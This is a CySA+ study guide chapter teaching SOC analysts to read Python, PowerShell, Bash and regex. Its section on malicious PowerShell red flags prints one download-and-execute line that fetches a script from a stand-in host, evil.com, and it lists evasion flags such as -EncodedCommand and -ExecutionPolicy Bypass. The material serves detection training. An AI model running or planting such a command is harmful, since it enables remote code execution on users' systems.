# Scripting Languages for Analysts

CySA+ explicitly lists scripting languages as a core SOC analyst skill. Expect questions where a snippet of code or regex is shown and you have to identify what it does or which output it produces. You don't need to write production-grade code; you need **literacy** - read it, understand intent, recognize obvious indicators.

## When SOC analysts script

- **Parsing logs** - extract specific fields from millions of lines.
- **Enriching alerts** - call APIs (VirusTotal, Shodan, internal CMDB) and add context.
- **Bulk lookups** - check 500 IPs against a threat feed.
- **Automating triage** - repetitive playbook steps.
- **Custom detections** - when the SIEM rule language can't express what you need.
- **Forensics** - quickly carve, hash, timeline.

## Python

The de facto language for security automation. Readable, huge ecosystem, runs on everything.

### Why analysts use it
- Clean syntax - easy to read others' code.
- Standard libraries: `re` (regex), `json`, `csv`, `datetime`, `subprocess`, `hashlib`.
- Security-specific libs: **requests** (HTTP), **scapy** (packet crafting), **pwntools** (exploit dev), **pefile** / **yara-python** (malware), **paramiko** (SSH).
- API clients for nearly every vendor.

### Snippets you should recognize

**Read a file line by line and find IPs:**
```python
import re
ip_pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
with open('access.log') as f:
    for line in f:
        for ip in ip_pattern.findall(line):
            print(ip)
```

**Hash a file (e.g., for IOC matching):**
```python
import hashlib
with open('suspicious.exe', 'rb') as f:
    print(hashlib.sha256(f.read()).hexdigest())
```

**Query VirusTotal for a hash:**
```python
import requests
r = requests.get(
    f'https://www.virustotal.com/api/v3/files/{file_hash}',
    headers={'x-apikey': API_KEY}
)
print(r.json()['data']['attributes']['last_analysis_stats'])
```

### Exam-relevant constructs
- `for ... in ...` loops over a sequence.
- `if ... elif ... else`.
- `with open(...) as f:` - file handling.
- List comprehensions: `[x for x in items if condition]`.
- `import re`, `re.search`, `re.findall`.

## PowerShell

Microsoft's scripting language. **Default for Windows admin and forensics.** Also an attacker favorite (T1059.001 in MITRE ATT&CK) - analysts must read it both for benign and malicious use.

### Why analysts use it
- Native to Windows; no install.
- Object-based pipeline (not just text like bash).
- Direct access to .NET, WMI, AD, Exchange, registry.
- Remote execution via WinRM (`Invoke-Command`, `Enter-PSSession`).

### Snippets you should recognize

**List running processes:**
```powershell
Get-Process | Where-Object { $_.CPU -gt 100 }
```

**Find files modified in last 24 hours:**
```powershell
Get-ChildItem -Path C:\ -Recurse -File |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddHours(-24) }
```

**Get scheduled tasks (persistence check):**
```powershell
Get-ScheduledTask | Where-Object { $_.State -eq 'Ready' } |
    Select-Object TaskName, TaskPath, Author
```

**Search Windows Event Log for failed logons (4625):**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} -MaxEvents 50
```

### Malicious PowerShell - red flags
- **`-EncodedCommand`** (or `-enc`, `-e`) - base64-encoded payload to evade detection.
- **`IEX`** (Invoke-Expression) downloading and executing remote scripts:
  ```powershell
  IEX (New-Object Net.WebClient).DownloadString('http://evil.com/x.ps1')
  ```
- **`-ExecutionPolicy Bypass`** - sidesteps default policy.
- **`-WindowStyle Hidden`** - runs invisibly.
- **`-NoProfile -NonInteractive`** - common in implants.
- **AMSI bypass strings** - attempts to disable Antimalware Scan Interface.
- **Reflective DLL loading**, **Add-Type** with C# inline source.

These flags appearing together is a strong indicator of malicious activity. SIEM/EDR rules detect them.

### PowerShell logging (analyst angle)
- **Module logging** - records pipeline execution.
- **Script block logging** - records actual code that executed (decodes encoded commands). Event ID **4104**.
- **Transcription** - full session log to file.
- Enable all three in Group Policy for high-fidelity PowerShell visibility.

## Bash

Linux/macOS shell. Daily for log triage, system inspection, quick automation.

### Snippets you should recognize

**Top 10 source IPs from access log:**
```bash
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head
```

**Find recently modified files in /tmp:**
```bash
find /tmp -type f -mtime -1
```

**Search for failed SSH logins:**
```bash
grep "Failed password" /var/log/auth.log
```

**Extract URLs from a file:**
```bash
grep -oE 'https?://[^ "]+' suspicious_email.txt
```

**Quick hash:**
```bash
sha256sum suspicious.bin
```

### Pipelines
The `|` (pipe) chains commands; output of one becomes input of next. Recognize common patterns:
- `cat file | grep X | wc -l` - count lines matching X.
- `cmd | sort | uniq -c | sort -rn | head` - frequency-rank a list.
- `grep -v` - *exclude* matches.

### Common Linux commands an analyst should read
- `ps aux` - process list.
- `netstat -tulpn` / `ss -tulpn` - listening ports.
- `lsof -i` - open network sockets.
- `last`, `lastlog`, `w` - login activity.
- `journalctl -u <service>` - service logs (systemd).
- `find / -name X 2>/dev/null` - locate files.
- `iptables -L`, `nft list ruleset` - firewall rules.

## Regex (Regular Expressions)

Pattern matching language. Universal - used in Python, PowerShell, Bash, SIEM queries, EDR detections, IDS rules.

### Anchors
- `^` - start of line / string.
- `$` - end of line / string.
- `\b` - word boundary.

### Character classes
- `\d` - digit (0-9).
- `\w` - word character (letters, digits, underscore).
- `\s` - whitespace.
- `.` - any character (except newline by default).
- `[abc]` - one of a, b, or c.
- `[^abc]` - *not* a, b, or c.
- `[a-z]`, `[A-Z]`, `[0-9]` - ranges.

### Quantifiers
- `*` - zero or more.
- `+` - one or more.
- `?` - zero or one (also makes greedy → lazy).
- `{n}` - exactly n.
- `{n,m}` - n to m.

### Grouping & alternation
- `(...)` - capture group.
- `(?:...)` - non-capturing group.
- `a|b` - a or b.

### Useful patterns to recognize

**IPv4 (loose):**
```
\b(?:\d{1,3}\.){3}\d{1,3}\b
```

**Email (loose):**
```
[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}
```

**MD5 hash (32 hex):**
```
\b[a-fA-F0-9]{32}\b
```

**SHA-256 hash (64 hex):**
```
\b[a-fA-F0-9]{64}\b
```

**URL:**
```
https?://[^\s<>"]+
```

**Credit card (basic, doesn't validate Luhn):**
```
\b(?:\d[ -]*?){13,16}\b
```

### Exam-style question pattern
"Given regex `<pattern>`, which input matches?" - read left-to-right, mentally apply each construct. The traps usually involve:
- Greedy vs lazy quantifiers.
- Anchor presence (`^...$` vs unanchored).
- Character class subtleties (`\d` vs `[0-9]`, `\.` vs `.`).
- Escaping (`\.` matches a literal dot; `.` matches anything).

## Other you may see

- **YARA rules** - pattern matching for files (malware classification). Looks like:
  ```
  rule SuspiciousString {
      strings:
          $a = "evil_c2_marker"
          $b = { 90 90 90 EB FE }
      condition:
          $a or $b
  }
  ```
- **Sigma** - SIEM-agnostic detection rule format (YAML).
- **Snort/Suricata rules** - IDS signatures (text-based pattern + action).
- **KQL** (Kusto Query Language) - Microsoft Sentinel, Defender XDR, Azure Log Analytics.
- **SPL** (Search Processing Language) - Splunk.

You don't need to write these for CySA+ but should recognize what they are.

## Exam tips

- Recognize **encoded PowerShell** as a red flag (`-EncodedCommand`, `IEX (New-Object Net.WebClient)...`).
- Recognize **Linux pipeline patterns** (`sort | uniq -c | sort -rn` = "rank by frequency").
- Be able to **match a regex to expected input** (or rule out non-matches).
- Know which language is **native to which OS** (PowerShell = Windows, Bash = Linux).
- Know **PowerShell event ID 4104** = script block logging (decoded malicious scripts show up here).
- Understand that scripting is used for **both attack and defense** - same `IEX` syntax in a benign sysadmin script and an attacker dropper.

---

← Back: [01_14 Threat Hunting](01_14_threat_hunting.md) - Next: [01_16 Process & Automation](01_16_process_and_automation.md) →

## Related

**Internal:**
- [01_09 Logs and monitoring](01_09_logs_and_monitoring.md) - scripts often parse these
- [01_12 File and malware analysis](01_12_file_and_malware_analysis.md) - hashing, strings, automation
- [01_14 Threat hunting](01_14_threat_hunting.md) - custom hunt queries
- [01_16 Process and automation](01_16_process_and_automation.md) - SOAR layers automation on top

**External:**
- [PowerShell documentation](https://learn.microsoft.com/en-us/powershell/)
- [Python documentation](https://docs.python.org/3/)
- [Bash reference manual (GNU)](https://www.gnu.org/software/bash/manual/)
- [regex101 - interactive regex tester](https://regex101.com/)
- [Sigma (detection-rule format)](https://github.com/SigmaHQ/sigma)
